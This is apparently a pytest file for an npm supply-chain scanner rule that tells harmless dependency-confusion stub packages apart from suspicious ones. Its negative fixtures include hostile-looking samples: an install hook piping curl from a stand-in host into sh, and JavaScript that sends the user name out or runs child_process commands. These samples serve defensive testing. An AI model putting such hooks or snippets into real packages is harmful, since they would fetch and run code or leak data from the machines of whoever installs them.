"""`npm.artifact.install-stub`: dependency-confusion placeholders whose install hooks only throw
(inert fixtures; nothing is run)."""

import json

import pytest

from kitsunox.core.models import (
    ArtifactRef,
    PackageVersionRef,
    PublishInfo,
    Severity,
    VersionSnapshot,
)
from kitsunox.ecosystems.npm.rules.artifact import InstallStub, stub_file
from kitsunox.util.archive import ArtifactTree, SkippedEntry

JETBRAINS = (
    b'throw new Error("Installation terminated!" + "\\n" + "This is stub package to mitigate'
    b' risks of Dependency Confusion attacks." + "\\n" + "Read more: https://jb.gg/x");\n'
)


def case(
    hooks: dict[str, str],
    extra: dict[str, bytes] | None = None,
    *,
    stub: bytes = JETBRAINS,
    size_delta: int = 0,
) -> tuple[VersionSnapshot, dict[str, bytes]]:
    files = {
        "package.json": json.dumps({"name": "kx", "version": "999.9.9", "scripts": hooks}).encode(),
        "README.md": b"## Description\n\nThis public copy of the package is a stub.\n",
        "fail.js": stub,
        **(extra or {}),
    }
    size = sum(len(c) for c in files.values()) + size_delta
    snapshot = VersionSnapshot(
        ref=PackageVersionRef(ecosystem="npm", name="kx", version="999.9.9"),
        publish=PublishInfo(),
        manifest={"name": "kx", "version": "999.9.9"},
        artifact=ArtifactRef(url="https://r.test/kx-999.9.9.tgz", unpacked_size=size),
    )
    return snapshot, files


def test_jetbrains_placeholder_is_a_stub() -> None:
    snapshot, files = case({"preinstall": "node fail.js"})
    (finding,) = InstallStub().evaluate_artifact(snapshot, files)
    assert finding.severity is Severity.INFO and finding.weight == 0.0
    assert "`preinstall`: `fail.js`" in finding.explanation
    assert finding.evidence[0].path == "fail.js"
    assert (finding.evidence[0].snippet or "").startswith('throw new Error("Installation')


@pytest.mark.parametrize(
    "stub",
    [
        b"throw new Error('placeholder');",
        b"throw Error(`placeholder`)\n",
        b'throw "placeholder"',
        b'#!/usr/bin/env node\n"use strict";\n// a stub\n'
        b"/* no code */ throw new Error(\n  \"a\" +\n  'b'\n);\n",
        b'throw new Error("cost $5, not ${x}" + `a \\${b}`);',
    ],
)
def test_constant_throw_shapes(stub: bytes) -> None:
    snapshot, files = case({"preinstall": "node ./fail"}, stub=stub)
    assert InstallStub().evaluate_artifact(snapshot, files)


@pytest.mark.parametrize(
    "stub",
    [
        b'require("https").get("https://x.test/" + process.env.USER);\nthrow new Error("x");',
        b'throw new Error("x" + process.env.HOME);',
        b"throw new Error(`user ${require('os').userInfo().username}`);",
        b'throw new Error("x"); require("./payload");',
        b'throw new TypeError(String(require("child_process").execSync("id")));',
        b'throw new Error((() => "x")());',
        b'throw new Err("x");',
        b'throw new Error("x", { cause: process.env });',
        b'Error = function () {}; throw new Error("x");',
        b'throw new Error("unterminated);',
        b"",
        b"\xff\xfe throw 'x'",
    ],
)
def test_anything_more_than_a_constant_throw_is_not_a_stub(stub: bytes) -> None:
    snapshot, files = case({"preinstall": "node fail.js"}, stub=stub)
    assert not InstallStub().evaluate_artifact(snapshot, files)


@pytest.mark.parametrize(
    "hooks",
    [
        {"preinstall": "node fail.js || true"},
        {"preinstall": "node fail.js && curl https://x.test"},
        {"preinstall": "node -r ./x.js fail.js"},
        {"preinstall": "node fail.js", "postinstall": "node index.js"},
        {"preinstall": "node fail.js", "postinstall": "curl https://x.test | sh"},
        {"preinstall": "node missing.js"},
        {"preinstall": "node README.md"},
    ],
)
def test_every_hook_must_run_a_stub(hooks: dict[str, str]) -> None:
    snapshot, files = case(hooks, {"index.js": b"module.exports = 1;\n"})
    assert not InstallStub().evaluate_artifact(snapshot, files)


def test_two_hooks_running_stubs() -> None:
    snapshot, files = case(
        {"preinstall": "node fail.js", "postinstall": "node lib/stop.cjs"},
        {"lib/stop.cjs": b"throw new Error('stop');\n"},
    )
    (finding,) = InstallStub().evaluate_artifact(snapshot, files)
    assert [e.path for e in finding.evidence] == ["fail.js", "lib/stop.cjs"]


def test_no_hook_is_no_stub() -> None:
    snapshot, files = case({"test": "node fail.js"})
    assert not InstallStub().evaluate_artifact(snapshot, files)


@pytest.mark.parametrize(
    "extra",
    [
        {"index.js": b"module.exports = require('os').userInfo();\n"},
        {"lib/x.json": b"{}"},
        {"binding.gyp": b"{}"},
        {".npmrc": b"node-options=--require ./fail.js\n"},
    ],
)
def test_the_package_ships_nothing_else(extra: dict[str, bytes]) -> None:
    snapshot, files = case({"preinstall": "node fail.js"}, extra)
    assert not InstallStub().evaluate_artifact(snapshot, files)


def test_licence_and_text_files_are_allowed() -> None:
    snapshot, files = case(
        {"preinstall": "node fail.js"},
        {"LICENSE": b"MIT\n", "docs/notes.txt": b"x\n", "CHANGELOG": b"x\n"},
    )
    assert InstallStub().evaluate_artifact(snapshot, files)


def test_only_on_the_whole_package() -> None:
    snapshot, files = case({"preinstall": "node fail.js"}, size_delta=50_000)
    assert not InstallStub().evaluate_artifact(snapshot, files)
    snapshot, files = case({"preinstall": "node fail.js"})
    tree = ArtifactTree(files, skipped=(SkippedEntry(path="evil", reason="symlink"),))
    assert not InstallStub().evaluate_artifact(snapshot, tree)
    assert not InstallStub().evaluate_artifact(snapshot, {"fail.js": JETBRAINS})
    bad = dict(files, **{"package.json": b"[1]"})
    assert not InstallStub().evaluate_artifact(snapshot, bad)
    bad = dict(files, **{"package.json": b"{"})
    assert not InstallStub().evaluate_artifact(snapshot, bad)


def test_stub_file_resolution() -> None:
    files = {"fail.js": b"throw 'x'", "stop": b"throw 'x'", "a.ts": b"throw 'x'"}
    assert stub_file("fail", files) == "fail.js"
    assert stub_file("fail.js", files) == "fail.js"
    assert stub_file("stop", files) is None
    assert stub_file("a.ts", files) is None
    assert stub_file("none", files) is None
